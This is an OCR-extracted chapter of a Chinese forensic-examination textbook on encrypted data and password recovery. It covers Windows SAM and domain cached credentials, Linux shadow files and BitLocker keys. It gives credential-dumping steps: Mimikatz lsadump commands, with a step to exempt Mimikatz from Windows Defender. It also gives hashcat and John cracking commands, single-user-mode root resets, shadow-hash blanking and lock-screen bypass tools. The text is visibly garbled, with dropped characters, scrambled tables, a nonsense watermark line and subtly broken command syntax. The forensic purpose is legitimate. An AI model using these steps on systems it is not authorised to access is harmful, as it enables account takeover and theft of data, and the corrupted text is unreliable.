---
title: 电子数据司法鉴定实务_郭弘_第18章_加密数据提取与解密
type: concept
created: 2026-04-29
updated: 2026-04-29
tags: [电子数据鉴定, 司法鉴定, 加密数据提取]
source: 〔来源文件不存在〕
sources: "《电子数据司法鉴定实务》郭弘 科学出版社 2025年.md"
---

# 第十八章 加密数据提取与解密

在电子数据鉴定过程中，时常会遇到各种加密情况，例如微软Office、WPSOffice、AcrobatReader、WinRAR及7Zip等类型的文件加密；操作系统Windows、macOS、Linux内置的BitLocker、FileVault和LUKS等加密卷；此外，还有第三方的加密软件也可能用于加密相关数据，如VeraCrypt、TrueCrypt、PGP、SafeBoot等。在一些涉及服务器的案件中，网站代码或数据库中可能采用加密算法、哈希算法对数据进行加密或保护。

本章将介绍操作系统账户密码破解及绕密的方法，以及加密磁盘、加密容器、固件密码、文件类密码、哈希类密码、浏览器密码和数据库破解的方法。此外，还将探讨利用硬件加速设备提密码破解效率的法和实践。

## 第一节 操作系统账户密码破解及绕密

## 一、Windows系统相关密码提取与破解

## (—)Windows 本地账户

安全账户管理器(Security Accounts Manager,SAM)是Windows 操作系统管理用户账户安全所使用的一种机制。注册表文件 SAM 用来存储Windows操作系统密码的数据库文件。该文件通常默认存储于%windir%\system32\config目录中。微软为了避免明文密码泄漏，注册表SAM文件中保存的是明文密码在经过一系列算法处理过的哈希值，分为LM哈希（LMHash)和NTLM哈希(NTLM Hash)。在域控制器的活动目录数据库文件NTDS.DIT则存储了所有域用户和组的相关信息。

## 1. LM 哈希

Windows 2000、Windows XP 及 Windows Server 2003 系统默认使用 LM 哈希(LM Hash)。用户输入一个密码，如bd123456，首先原有密码信息全部转为大写字母，然后拆分为两部分，每7个字符一组。拆分后的字母再转化为二进制数据，每7个bit补一个0，转为十六进制字符，左边部分最终为42220C262298D06A，右边部分为360000000000000。再使用魔术字符串“KGS!@#\$%”（十六进制：4B47532140232425）进行DES加密，得到左边部分的哈希值5D2CC2C03C053705，右边部分以同样方式进行计算，得到哈希值C81667E9D738C5D9。最后将左右两部分的哈希值合并，如图18-1所示。

## 2.NTLM 哈希

在Windows2000/2003/XP操作系统中，当用户设置的账户密码超过14位时，系统将密码以NTLM哈希方式进行存储，通过NTLM哈希进行身份认证。Vista及更新版本的操作系统都默认采用更加安全的NTLM哈希。

![](images/2b4020e25264aeaf2689f75e13f20114293be8050bf8a0312a584039c49e3cf2.jpg)  
图18-1 LM哈希DES加密转换

NTLM哈希的加密过程：首先将明文转换为16进制ASCII码，其次，使用LittleEndian（小端）式将其再转换为Unicode格式，即将标准ASCII串按LittleEndian转换成Unicode串，简单地在原有每个字节后添加0x00。最后，对所获取的Unicode串进标准MD4单向哈希,成128特的哈希值。

NTLM哈希同样可采用彩虹表加速密码破解，然而预先计算并成彩虹表将会消耗很多计算资源及时间，前有些站(如Ophcrack[151])提供了部分密码对应的NTLM哈希彩虹表，可来破解特定长度及复杂度较低的密码。

## 3.网络NTLM哈希

络NTLM哈希（NetNTLM）是种络认证协议，是基于挑战（challenge）/响应（response)认证机制的种认证模式。NTLM协议的认证过程分为协商、质询和验证。前分为两个版本：Net-NTLMv1和Net-NTLMv2。从WindowsVista/Server2008开始，系统默认禁Net-NTLMv1,使Net-NTLMv2。Net-NTLMv1和Net-NTLMv2加密流程存在些差异，见表18-1。

表18-1Net-NTLMv1和Net-NTLMv2加密流程
<table><tr><td>Net-NTLMv1加密流程</td><td>Net-NTLMv2加密流程</td></tr><tr><td>●客户端向服务器发送一个请求 发送回客户端 hash对Challenge加密，作为response发送给服</td><td>● 客户端向服务器发送一个请求 ●服务器接收到请求后，生成一个8位的Challenge，·服务器接收到请求后，生成一个16位的Challenge， 发送回客户端 ●客户端接收到Challenge后，使用登录用户的密码·客户端接收到Challenge后，使用登录用户的密码 hash对Challenge加密，作为response发送给服</td></tr></table>

## （二）域缓存凭证

在Windows活动录(也称为域Domain)的环境中,域户可直接登录Windows系统。为了避免域控制服务器出现故障时，域户仍可通过本地缓存的密码进份验证。该域户缓存到计算机本地的用户名及密码时常称之为域缓存凭证(DomainCachedCredentials，DCC），也时常被称为“MSCACHE”。到目前为止Windows的域缓存凭证有两个版本，分别是MSCACHEv21和MSCACHEv2。域缓存凭证数据存储于SECURITY注册表文件中，通过注册表编辑器 HKEY_LOCAL_MACHINE\SECURITY\Cache 可查看到10 个NL \$前缀的值，NL \$1～NL\$10,如存在域用户的缓存凭证，其数据就会更新，而全零的数据对应的条目则不存在缓存凭据信息，如图18-2所示。

![](images/d478844b0c08e0980471f6f1782e329758e59823aa114cf064ef37c08af0b41d.jpg)  
图18-2注册表中域用户缓存凭证

## 1.开机状态域缓存凭证提取及密码破解

Windows系统正在运行状态时，可通过工具（如Mimikatz)获取到本地缓存的域缓存凭证信息。在目标Windows10系统中，以管理员权限运行命令行提示符（cmd），通过命令行进入到优盘中保存的mimikatz程序目录，运行mimikatz.exe，然后按次序输入以下3条命令即可获得域缓存凭证。

privilege::debug

• token : : elevate

• lsadump: : cache

需要注意的是，Windows Defender 内置软件可能会识别出Mimikatz并自动将其隔离，需在WindowsDefender中配置“排除项”，将正常文件替换原有被隔离的文件，最后重新运Mimikatz可执程序。将开机状态获得的域用户对应的MsCacheV2的哈希值进复制，可使用John the Ripper[152或 Hashcat[153]单独对其进行密码破解。命令如下：

```batch
john --format = mscasch2 --wordlist = rockyou.txt mhash
```

hashcat -m2100 · \$ DCC2 \$ 10240 #username #3407de6ff2f044ab21711a394d85f3b8·/us/ share/wordlists/rockyou.txt --force --potfile-disable

## 2.离线状态域缓存凭证提取及破解

域缓存凭证(DCC)可通过静态方式，借助相关的工具直接从SYSTEM和SECURITY文件中进行提取。常用的工具有Pascape Windows Password Recovery[154]（WPR）、Elcomsoft

Proactive System Password Recovery [55(PSPR)等。

使用Passcape WPR 提取域缓存凭证及破解。运行Passcape Windows Password Recovery，点击顶部的“导入”按钮，选择“二进制文件”，并选择DCC。在SAM 输入框中选择PC客户端系统提取的 SECURITY注册表文件，SYSTEM 输入框则选择PC客户端系统提取的SYSTEM注册表文件。选择“导入”按钮后，软件会自动解析出PC客户端系统本地缓存过的域用户名、类型，RID、NTHash以及说明（含账户的其他相关信息)，如图18-3所示。默认情况下，WindowsPassword Recovery会自动使用默认的策略尝试对域用户的密码进暴力破解。如需修改策略，可通过顶部菜单“恢复”，并选择“停止”，然后重新修改破解策略。

![](images/bf552a8f79e169cee22543d6ae2d59c329cc61d9430956e41bb019a7eb776c2c.jpg)  
图18-3用户账户信息(导入后)

## 3.使用 Elcomsoft PSSP 提取域缓存凭证及破解

运行 Elcomsoft Proactive System Password Recovery, 双击"Domain cached credentials",软件 默认自动读取当前计算机Windows是否存在域缓存凭证。如不存在域缓存凭证，软件将提示 " Cached entries was not found/decrypted."

如已通过计算机鉴定软件或其他方式将Windows系统的SYSTEM 和 SECURITY 注册表文件单独提取或复制到特定位置，可直接勾选“Manual decryption”。然后手工指向已预先提取的注册表文件的所在位置，通过输入框的“浏览”按钮选择注册表文件路径，并选择“Manualdecryption”按钮。应注意，通过手工解密操作，只能解析出注册表文件中缓存的域用户及其相关信息，如存在多个域用户缓存凭据，通过 Domain cached entry的下拉框可进行不同用户的选择。通过选择其中一个用户，可查看登录的域名称、域用户最后访问时间及密码哈希等信息，如图18-4所示。

![](images/8c50ac0f825036c65101cfdd2c32a1311c4a6f345b5549b4f9c132e11c1f5e0d.jpg)  
图18-4域缓存凭证解析结果

## （三）微软账户

Microsoft账户是个由微软开发与提供的“单点登录”服务，允许使者使个账户登录微软的平台访问其相关资源。

Windows系统启允许微软账户来登录计算机，在Windows系统中旦开启“需要通过WindowsHello登录Microsoft账”,在Windows登录画中只能允许通过Windows Hello相关机制进登录，如PIN码、人脸识别、指纹及安全密钥等。

除WindowsHello相关机制允许于份认证,微软账户、本地Windows账户等均不允许登录Windows系统。该微软账户及密码将会在本地计算机中成缓存，从在法联时，可进离线份验证。

鉴定在遇到检材涉及微软账户的分析，可在案发现场直接观察或在实验室使计算机动态仿真鉴定软件挂载证据件后，检查Windows登录界来初步识别Windows系统所使的账户是本地账户还是微软账户。如需对计算机中缓存的微软账户的密码进破解，可使第三具（如Passcape Windows Password Recovery、Passware Kit Forensic）对其进密码破解。

## （四）Windows密码破解

## 1.使WindowsPasswordRecovery提取微软账户缓存哈希及破解

WindowsPassword Recovery通过“导”,选择“进制件”,再选择“CloudCache”,然后指定待提取微软账户的Windows系统对应的Windows录，该软件会动搜索缓存的微软账户或AzureAD账户。通过设置破解规则和策略，可破解出缓存于Windows系统本地的微软账

户的密码，如图18-5所，将NTHash字段的值复制出来，经过计算可发现该哈希值为128个字符，如图18–6所。

![](images/e64707371a3fe855b2f9b99068dc68043be06abb5fd59a0b1f02c33b1876bd9c.jpg)  
图18-5微软账户登录选项

![](images/2d32d5dfcd356700dea2e7a3a3aebe1cea90d787661a45d63ce19c6fe906849b.jpg)  
图18-6 微软账户密码哈希(128个字符)

## 2.使PasswareKitForensic提取微软账户缓存哈希及破解

1）选择Passware Kit Forensic[156]主界中的“Standalone System Analysis”,并选择Config件夹指向标计算机系统中提取的系统注册表件(SAM/SECURITY/SYSTEM/SOFTWARE)，如图18-7所。

![](images/2731fb0486ae8c755e813a0c9b4bb1b65e170a183e4e6d1169b067bf1fec515a.jpg)  
图18-7 Passware独系统分析

2）选择微软账户，设置密码破解策略和破解规则,最终成功破解出原密码。

## 二、Windows系统绕密

计算机硬盘未启用任何相关磁盘加密技术时，硬盘可在拆卸后直接获取为证据件，使用计算机鉴定分析软件即可直接读取和分析证据件中的所有数据，须考虑原有Windows系统的用户密码。在一些特定的案件中，涉案的关键证据可能存储于加密磁盘中（如内置TPM芯的计算机默认启“设备加密”机制、微软账户登录Windows系统并启BitLocker加密），需要借助相关的鉴定设备实现绕密取证，并对加密数据进行解密。如计算机内置的硬盘无法拆卸，则需要使用相关的免拆机鉴定设备进行数据获取，并尝试直接对加密数据进行解密。

操作系统绕密取证是从事电数据司法鉴定的机构的必备能之。该能主要是针对运状态的操作系统。操作系统绕密取证主要体现在两个，种是使动态仿真鉴定软件模拟运操作系统时实现密码重置，种为原有待检验的机器上直接进绕密。

## (一)动态仿真环境下的Windows 密码重置

大多情况下需先对检材中的电子数据进行证据固定，将原始存储介质制作为证据文件（如dd、E01等格式）。如需要将原有Windows 操作系统环境模拟运行，可使用动态仿真鉴定软件。在动态仿真鉴定软件中，通常内置了重置Windows系统用户密码的功能。鉴定人也可通过特定的Windows系统用户密码重置引导盘或ISO镜像文件来对仿真后的Windows系统进行密码重置，从而在不知道Windows用户密码的情况下进入用户的桌面，直观查看相关的信息。

常见的Windows 密码重置启动盘有内置OfflineNT Registry Editor 编辑器的WinPE启动盘、Passware Windows Key 启动盘和 Elcomsoft System Recovery 启动盘。

## 1. Passware Windows Key 重置密码

通过Passware Windows Key制作启动引导盘或 ISO 镜像文件后，使用Windows Key 启动盘引导虚拟机系统，启动后，选择操作系统版本，并选择“Next（下一步）”。勾选要重置密码的账户，可同时勾选多个账户，重置后的密码均相同。完成对Windows系统密码重置后，重新启动即可使用Windows Key指定的密码或直接登录Windows 系统。

## 2. Elcomsoft System Recovery 重置密码

俄罗斯 Elcomsoft System Recovery(ESR)是一款针对Windows 操作系统进行密码重置、密码提示信息提取及加密磁盘密钥信息提取的工具集。支持对SAM(Windows本地用户数据库）、NTDS.DIT（域控制器用户数据库）和域缓存凭据（DCC)密码提取。Elcomsoft引导启动盘进行Windows 密码重置步骤为：①ESR引导启动盘;②选择Windows系统所在的盘符;③选择数据源；④SAM本地账户相关功能并设置SAM文件数据解析方式;⑤查看并选择要重置的用户账户（图18-8)。

![](images/d0f856a9e0aab3ad31fe68001aa06c11b50ffdc2064ca1b834f82a392074a3da.jpg)  
图18-8查看并选择要重置的用户账户

## (二)直接对原有计算机系统进行绕密取证

## 1.基于开机内存直接修改的系统绕密

美国Kcyptos Logic 公司的Kon-Boot是一款在不知道Windows用户密码的情况下，直接开机绕过Windows的身份认证。与其他的解决方案不同的是，Kon-Boot不会重置或修改用户密码，所有更改在系统重启后都会恢复到以前的状态。Kon-Boot支持WindowsXP、Vista、Windows 7、Windows 8/8.1、Windows 10及Windows 11 等操作系统的开机密码绕过，是目前唯一可以绕过Windows10微软账户的密码的工具。

## 2.基于内存直接访问的Windows 系统绕密

内存直接访问（Direct Memory Access,DMA)是一种绕过CPU处理器直接与计算机物理内存进行数据访问的方式。DMA绕密是一种基于特定硬件接口实现对目标计算机的内存直接访问，通过临时性修改内存中的身份认证代码实现Windows 的登录密码绕过。通过DMA 内存直接访问，还可直接将目标计算机的物理内存制作成镜像文件。

DMA绕密技术可通过无线网卡（M.2)M.2 NVMe、PCIe、Mini PCIe及 ThunderBolt等多种不同的接口实施绕过Windows锁屏密码。支持Windows XP至Windows 11 的版本全系列的锁屏密码绕过，也支持对具有TPM芯BitLocker加密的笔记本电脑锁屏密码绕过功能。详细的临机绕密取证方法及操作步骤可参考本章第二节的“BitLocker密码破解与绕密取证”。

## 三、Linux账户密码破解

早期的Linux发行版本，系统将用户账户及密码信息直接存储于/etc/passwd。大多现代Linux发行版本中，系统的用户密码存储于/etc/shadow文件中，passwd文件仍然保留，但并不包含用户的密码字符串，如图18-9所示。passwd文件默认所有用户都有读取权限，而shadow文件只有root用户拥有读取权限，其他用户没有任何访问权限，保证了用户密码的安全性。

![](images/a09cee12a67eabb0d586e73dcb58560c2b02b0a24a17eba3e7b5e401608a2c91.jpg)  
图18-9用户及密码相关文件的安全性

## (一) passwd文件

passwd件是Linux系统内置的系统件,包含了Linux系统所有账户的户名、户标识符(UID）、组标识符(GID)和主录等信息，每对应个户账户，如图18-10所。

![](images/3b652a4a547e0358b89a75d64a1580cbc91a39abd806353ed015103ed68ae1a9.jpg)  
图18–10 Linux passwd件结构

格式：户名：密码：UID:GID:完整名称：主录路径：登录shell

其中第个字段在早期Linux版本中存储户密码，现在多数Linux系统默认记录户的状态：x（正常），！（禁）。实际的账户密码则存储于/etc/shadow件中。

## (二）shadow件

shadow件中每代表个户，使“：”作为分隔符，不同之处在于，每户信息被划分为9个字段。每个字段的含义如下：

用户名：加密密码：最后次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账户失效时间：保留字段

加密密码是由一个加密字符串组成，格式为\$id\$salt\$hash，其中\$id\$代表对应的加密或哈希算法。前不少Linux发版本均默认采SHA-512进加密，其对应值为\$6\$，LinuxDebian 11或以上版本则使\$y\$（yescrypt）。

• \$1\$： MD5

• \$2\$： Bcrypt

\$2a\$: Blowfish

• \$2b\$：Bcrypt

• \$2y\$： Blowfish

•\$5\$： SHA-256

•\$6\$： SHA-512

•\$y\$: yescrypt

## 四、Linux操作系统绕密

动态仿真鉴定应中,Linux操作系统可在脱机情况下通过修改shadow件实现绕过系统的份验证。如果运Linux系统服务器不能长时间断电关机，可重新启动Linux操作系统，通过GRUB菜单临时修改配置参数，从进单户模式。

## (一）单用户模式绕密

Linux操作系统默认提供单户模式(SingleUserMode），可来修改件系统损坏、还原

配置件、重置户密码和移动户数据等。

通过Linux单用户模式进系统，管理员无须输入原有超级管理员的密码，可对系统进行管理和各种操作(包括添加用户、重置密码等）。

不同Linux发版本进入单用户模式需设置的参数存在一些差异，此外，进单用户模式后，修改指定用户密码的操作命令也有所不同，见表18–2。

表18-2CentOS重置密码常见方法
<table><tr><td>操作系统版本</td><td>GRUB参数(单用户模式)</td><td>重置用户密码的步骤</td></tr><tr><td>CentOS 6</td><td>rw init=/bin/sh</td><td>• passwd root(重置 root 密码) ⚫ exec/sbin/init(重新启动)</td></tr><tr><td>Cent OS 7/8</td><td>方法1：最后一行末尾加一个空格并 输入 rw init=/bin/sh 方法2：找到ro crashkernel = auto,将其 改为rw init=/sysroot/bin/sh</td><td>方法1步骤： • passwd root(重置root 密码） touch/.autorelabel ⚫ exec/sbin/init(重新启动） 如忘记加rw，需要使用以下命令 • mount -o remount,rw/（可选） 方法2步骤： • chroot/sysroot ⚫ passwd root(重置root 密码）</td></tr><tr><td>Ubuntu/Debian bin/bash</td><td>ro recovery nomodeset 改为 rw init =/·passwd root(重置root密码)</td><td>touch/.autorelabel ⚫ exec/sbin/init(重新启动） ⚫ exec/sbin/init(重新启动)</td></tr></table>

## (二)基于动态仿真的系统绕密

使专门的计算机动态仿真具进Linux系统的仿真模拟时，如具内置了Linux绕密或重置密码，可直接使用其功能。如未能提供该功能，鉴定人也可通过单用户模式重置管理员账户或已有账户的密码。

此外还可借助第三方工具，直接加载Linux磁盘分区的文件系统，找到/etc/shadow文件，通过清空用户相应的密码字符串，并将该文件回写到虚拟挂载的磁盘中。该方法适用于各种不同的Linux发版本，无须记忆单用户模式的参数修改设置及相关的户密码重置的命令。

## 1.设置磁盘编辑模式

Linux操作系统使用了多种文件系统，除ext2/ext3/ext4外，XFS和ZFS目前也是多种Linux发版本常的件系统。前能持直接对虚拟磁盘中的件系统进读写的具并没有很多。WinHex Lab或X-Ways Forensics支持丰富的Linux文件系统，可用于动态仿真场景下的Linux系统密码清除，从而实现Linux系统绕密启动。需要注意的是WinHex、WinHexSpecialist 和 Professional 等版本均无法支持XFS、Btrfs、QNX、ReiserFS、Reiser4 和APFS 等文件系统。WinHex Lab版本可直接对虚拟后的磁盘进行读取数据及编辑。X-Ways Forensics是计算机鉴定的专用分析软件，默认以只读方式读取虚拟磁盘数据。如需直接对磁盘进数据写入操作，可将xwforensics64.exe复制为副本文件，并重命名为WinHex64.exe。勿商用。

运行WinHex64程序，通过按快捷键“F9”或顶部菜单“工具”选择“打开磁盘”，选择物理磁盘或虚拟磁盘后，可直接查看磁盘中的分区信息，如图18-11所示。

![](images/bc79f9d849ed2867b98389ea65b9b0c40ab2dfa685449ab0a6bd9536f5c194dc.jpg)  
图18-11添加物理磁盘/虚拟磁盘

## 2.修改 shadow 文件内容

逐个分区双击进行查看根目录下的文件夹列表，直到找到包含/etc文件夹的分区，并双击进入该文件夹。在/etc目录中找到 shadow文件，右击该文件，并从菜单中选择“打开”。注意：菜单中存在两个名称为“打开”的选项，需选择第二个打开。

打开后，WinHex将打开独立的新窗口，在文件 shadow的窗口中找到要清除密码的用户名，选择整个加密密码字符串，注意不要多选或少选，仅选择两个冒号中间的字符串即可，如图18-12所示。

![](images/8663b4fddd87c4f3c6883386bcb4f5a40adc3c896b45cd35d69bcb86a3df442d.jpg)  
图18-12定位用户的密码字符串位置

按快捷键Ctrl+X，将选择的字符串进行剪切（相当于删除），关闭shadow文件窗口即可。完成后，重新打开shadow文件，发现该文件内容已经更新并写入磁盘，如图18-13所示。

![](images/0a0baa8f5a4fdb350c446d852ffd99eac11c1a362351f1b5414ad41f0e39068a.jpg)  
图18-13删除密码字符串后重新验证查看

## 3.Linux动态仿真绕密

通过清空shadow文件中用户密码字符串的方法，结合动态仿真鉴定软件，在Linux模拟仿真并进入系统登录窗口后，直接选择用户名，无须输入密码，即可直接进入用户的桌面。

## 第二节 加密磁盘及加密容器

## 一、BitLocker加密卷破解

## (—)BitLocker概述

BitLocker是在WindowsVista中新增的一种数据保护功能，主要用于保护计算机磁盘中的数据，包括操作系统所在分区。BitLocker可有效对操作系统所在分区进行全卷加密，弥补 EFS文件加密机制的不足。从Windows 7 操作系统开始，Windows系统支持采用BitLocker To Go对移动存储介质进加密。

BitLocker可加密存储于Windows操作系统卷上的所有数据，默认没有TPM加密芯片的情况下，Windows不允许启用对操作系统卷的加密。然而，通过修改组策略，也可强行打开BitLocker加密，但需要每次开机输入恢复密钥信息。对于非操作系统分区，Windows支持对其

直接进行加密，可设置独立的保护密码。

微软的 BitLocker 支持多种方式进行部署，包括密码、SID(支持域用户SID)、TPM、TPM+PIN、TPM+USB Key、TPM+USB Key+PIN 等。因此，鉴定人员在检验带有 BitLocker 加密卷设备时需了解BitLocker的各种部署方式及其工作机制。

在Windows 10系统中BitLocker默认使用XTS-AES128加密算法来对数据进行加密保护。在实践中，管理员可根据需求，修改BitLocker 默认使用的加密算法，提升加密强度。除XTS-AES 128算法外，还支持XTS-AES 256、AES-CBC 128和AES-CBC 256等加密算法。

通过Windows 的组策略可修改驱动器加密算法，通过 gpedit.msc 打开本地组策略编辑器，在“计算机配置\管理模板\Windows组件\BitLocker 驱动器加密”中可找到选择驱动器方法和密码长度（Windows 10[版本1511]和更高版本)，如图18–14所示。双击该策略可启动，并修改加密算法。

![](images/b176434492d7a931f8ee738173bf6fe84ba56123582ee7ef623a2ddbd39f2d7e.jpg)  
图18-14 BitLocker驱动器加密组策略修改

Windows 组策略的配置通常直接存储于注册表中，因此，也可直接通过修改Windows注册表来调整BitLocker加密算法和加密强度，如图18–15所示。

•EncryptionMethodWithXtsOs（操作系统驱动器的加密方法)

•EncryptionMethodWithXtsFdv（固定数据驱动器的加密方法)

•EncryptionMethodWithXtsRdv（可移动数据驱动器的加密方法)

其加密算法与数字的对应关系如下：

• 3 = AES–CBC 128-bit

• 4 = AES-CBC 256-bit

• 6 = XTS-AES 128-bit(Windows 10 默认使用)

• 7 = XTS-AES 256-bit

早期的Windows7/8/8.1要求使用旗舰版或加入域的企业版才能启用 BitLocker。然而，随着用户对数据保护需求的增加，微软在自主研发的Surface系列电脑上集成了TPM2.0芯,Windows系统可使TPM2.0芯来存储密钥。

![](images/679b50efa293f11f928ca1e5716e54b1e9df3eb9ad01202206c3874b1d18dae1.jpg)  
图18– 15 注册表直接修改 BitLocker 加密算法

对于支持新式待机（Modern Standby)模式的计算机，微软公司从Windows8.1系统开始默认启用一种基于TPM的BitLocker加密机制，即“设备加密”（Device Encryption）。该加密机制支持在Windows家庭版（Home)启用。

Windows系统中磁盘的一个或多个分区均会自动启用BitLocker加密，密钥直接存储于TPM芯中,Windows系统开机后，系统动读取TPM芯中的密钥信息并直接动态解密,与Windows内置用户的密码没有任何关联。

随着微软Windows操作系统利TPM2.0芯来进数据加密的推，任何内置TPM2.0芯片的笔记本电脑，包括联想、戴尔、惠普、宏碁等，只要内置的操作系统为Windows10/11，户激活Windows系统后，系统将默认开启“设备加密”功能。

在处理内置TPM芯且启用设备加密的计算机时，应借助免拆机鉴定设备并借助持制作解密镜像的鉴定具，或在开机状态下以逻辑磁盘式加载BitLocker加密卷进数据获取作。如将计算机内置的硬盘拆卸下来，并使用硬盘复制机来获取全盘镜像，最终成的镜像件将仍然处于加密状态，且使计算机鉴定分析软件均法正常解析或解密。

## (二）BitLocker加密磁盘镜像挂载

在电子数据司法鉴定过程中，鉴定人可能使用不同的镜像挂载工具，然而不同的镜像挂载具在处理BitLocker加密磁盘时存在差异，部分镜像挂载具无法正常处理BitLocker加密卷的密码或恢复密钥验证。经过实际测试发现，采用以驱动程序方式挂载镜像文件时，带有BitLocker加密卷的虚拟磁盘才能被正常识别和处理。持驱动程序式挂载镜像的具有：Arsenal Image Mounter、VSCMount及取证师等。采用非驱动式挂载的虚拟磁盘，在进BitLocker加密卷的密码或恢复密钥验证时存在问题，常见的镜像挂载具如FTKImager和Mount Image Pro等。

以下将以Arsenal ImageMounter(AIM)为例介绍镜像件的挂载步骤。该具分为两个版本：Arsenal Image Mounter（免费版）和 Arsenal Image Mounter Professional（专业版）。AIM免费版持对常见的各种证据件格式及虚拟磁盘件格式进虚拟挂载,持dd、E01、Ex01、VMDK、VDI、VHD、VHDX 和AFF4等格式。

要挂载常见的证据文件或虚拟磁盘文件，可直接点击“Mountdiskimage（添加磁盘镜像）”。选择指定的证据文件或虚拟磁盘文件，如VHD、VMDK和EO1等。

挂载选项需根据实际情况进行选择，大多数情况下选择“Diskdevice，read only(磁盘只读模式）”。此外还有Write temporary（磁盘临时写模式）、Write original（磁盘回写模式）。Write temporary会生成一个差异文件，保存临时性变动的数据部分，并不会直接将变动的数据写回证据文件中。而Write original则可对虚拟挂载的磁盘进行变更、修改、删除等操作。

## (三)BitLocker 卷检验

manage-bde是Windows系统内置的BitLocker加密卷管理工具，鉴定人可通过该命令来查看外部挂载的证据件中的BitLocker加密卷的相关信息，包括BitLocker加密卷容量、加密法（算法）、锁定状态、密钥保护器信息和恢复密钥等。鉴定人可通过manage-bde工具直接查看BitLocker加密卷基本信息，命令为：manage-bde-status[盘符：]

图18-16中显示的是一个415.70GB大小的BitLocker加密卷，采用XTS-AES128加密算法，BitLocker版本为2.0，仅加密了已用空间。

![](images/d4f7e5ea7bae36e01e186f087512d59d7d383388e2ffb51ce47eea95e3ab1d8c.jpg)  
图18–16 BitLocker加密卷基本信息查看

## (四)BitLocker密钥提取

BitLocker加密卷成功挂载后，在Windows系统的物理内存中存在其相关密钥信息。如果用户已登录Windows 系统，也可通过Windows内置的manage-bde工具来获得密钥信息。

## 1.使用manage-bde 提取 BitLocker 密钥信息

当电数据鉴定人员在对处于开机运状态的计算机进证据保全时，须留意观察待检验的目标计算机是否存在 BitLocker加密卷。通过命令manage-bde -protectors -get[盘符：]可检查加密卷的密钥保护器信息。如BitLocker加密卷已处于解密状态，则可直接查看BitLocker恢复密钥，它是一个由八组6位数字组成的字符串，如图18-17所示。鉴定人员推荐用拍照、摄像或其他式记录BitLocker恢复密钥信息。如存在多个BitLocker加密卷，则需逐个对每个分区的恢复密钥信息进记录。

对BitLocker卷进行保护器信息检查时，应留意BitLocker卷是否存在外部密钥信息，鉴定人员应向委托人了解是否有相关存储介质保存带有BEK扩展名的文件。BEK文件可用于直接解密BitLocker加密卷，如图18-18和图18-19所示。

![](images/78bbe8a1ae50f3f405aa7b3e457cc58866a25f537827232875e6fbd59cd1ed75.jpg)  
图18-17 查看BitLocker密钥保护器信息

![](images/f8e002724d35718c73e91411737749c7e20145c15190b25c81ebcd7fb88222eb.jpg)  
图18-18 带有外部密钥信息的BitLocker卷(加密卷未解锁)

![](images/914443205548fd6161ae222f9f5438bf00dace6f73499f8839eb3762a61a395e.jpg)  
图18-19 带有外部密钥信息的BitLocker卷(加密卷已解锁)

如BitLocker加密卷已处于解密状态,可通过manage-bde命令将外部密钥信息进导出,如图18-20和图18–21所,参考命令为：manage-bde -protectors -get F：-SaveExtermalKey "H:\temp"。

![](images/cb5a56bcfe99b7f17d805545706c191afef1d1fa8310b37aa248698edfa13eec.jpg)  
图18-20 导出外部密钥信息

![](images/e8d89fcc863724bfdad45920ff4cf0d3046fcf04f54eabcdf1a5866ff19bbc1b.jpg)  
图18-21 导出后的密钥信息件(BEK文件扩展名）

## 2.注册表中缓存的BitLocker密钥提取

从Windows7版本开始，Windows系统持对启BitLocker加密的移动硬盘配置动解锁功能，户第次可输密码或智能卡，并选择动解锁功能,Windows系统将会在注册表中成动解锁的配置。

存储在注册表中的密钥和元数据通过DPAPI函数CryptProtectData对当前户登录凭据和3DES进加密（OTOH,加密卷中的实际数据时受到AES128、AES256或Elephant加密算法保护）。外部密钥只能与当前户账号和机器起使。如果切换到另个户账号或计算机，自动解锁功能将不起作用。

通过注册表编辑器，可检查相关注册表路径的键值信息，并将其数据导出为REG件。注册表缓存BitLocker动解锁的相关密钥的位置为HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\FveAutoUnlock,如图18–22所示。

![](images/75e90fd0d5fcfc41381f0327faf7161599ee59d8045b2937091e33aee7fba90a.jpg)  
图18-22 注册表中FveAutoUnlock键

## 3.使用取证大师提取内存中的BitLocker密钥件

取证师持从计算机物理内存中提取BitLocker密钥信息件，并通过导该件式直接解析加密卷数据，如图1823所。

![](images/5b6c4431b436b7bf7408ff0dbf0a0b13bd6d2070816849eabea877c5ddfc8a4d.jpg)  
图18-23 使内存密钥件解密BitLocker加密卷

## （五）BitLocker加密卷解析

如已知BitLocker卷的加密密码或已获得BitLocker恢复密钥，鉴定可使计算机鉴定分析软件进加载，在计算机鉴定软件中通常直接输BitLocker卷的密码或恢复密钥，成功验证后,计算机取证软件可直接解析出BitLocker加密卷的所有件及件夹列表信息。

## 1.使X-Ways Forensics解密BitLocker加密卷

司法鉴定可先使镜像挂载具（如ArsenalImageMounter、VSCMount等，需持驱动式挂载)将证据件或虚拟磁盘件挂载为虚拟磁盘。在Windows系统中直接输户或恢复密钥进验证，成功验证后，通过计算机鉴定分析软件添加解密后的BitLocker卷（逻辑磁盘驱动器式添加），如图18-24和图18-25所。

![](images/ab22aab83100c1209ed8ec5d151fd38ddfbc00b699a16495781cc5817221cd99.jpg)  
图18-24 输入正确的密码或恢复密钥

【誉罪業】余爸学羹禁來聖表往喬履符，表模蛋靠集整業智學主孝發彗研集尊药之用，请勿商用。

![](images/3f9613b130519dd6d2de4513ec91146ef8b6a26fecfc06e0b7dfdef30b43bb4c.jpg)  
图18–25成功解密后逻辑驱动器文件系统

## 2.使用注册表缓存密钥信息解密 BitLocker 加密卷

目前尚无直接利用注册表缓存的 BitLocker密钥直接解密BitLocker加密卷的工具，但鉴定人员可尝试使用DataProtectionDecryptor和十六进制编辑器等工具手工对BitLocker加密卷进行解密。Nirsoft DataProtectionDecryptor 解密 DPAPI数据需要具备一些必要条件，如加密时使用的Windows账号及其密码、对应用户下的Protect文件夹及系统注册表文件（SYSTEM和SECURITY)等。

使用Nirsoft DataProtectionDecryptor 成功解密后，可看到两条记录，每条记录的最后 32个字节是相同的，将此32个字节十六进制数据复制出来，如图18–26 所示。

![](images/212c9ab1fc62f8fd05752ad3cdc95ab9f00e5f97339f0a80cdc4c428c0a3fbb8.jpg)  
图18- 26 解密后的数据并复制尾部32 个字节十六进制值

在任何一台带有外部密钥信息的 BitLocker 加密卷的计算机上，使用manage-bde 命令将其外部密钥导出为BEK文件，以此文件作为模板，将其重命名为key_temp.BEK，并复制一个副本件并命名为keynew.BEK件。使HxD六进制编辑器打开两个件，将DataProtectionDecryptor解密出的32个字节六进制值复制到剪贴板，替换keynew.BEK件尾部的32个字节，并运该件可解密，如图18-27和图18–28所。

